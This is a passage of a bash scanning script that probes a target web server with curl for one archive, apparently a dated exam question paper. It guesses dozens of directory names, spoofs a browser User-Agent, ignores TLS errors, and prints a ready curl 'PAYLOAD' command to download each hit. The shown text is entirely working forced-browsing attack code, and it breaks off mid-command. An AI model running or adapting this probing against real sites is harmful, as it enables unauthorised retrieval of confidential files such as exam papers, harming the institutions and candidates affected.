echo -n "Payload [ControlQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ControlQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringQPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingDashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PortalQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PortalQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PortalQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessorQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessorQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessorQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessorTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessorTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessorTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchDatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
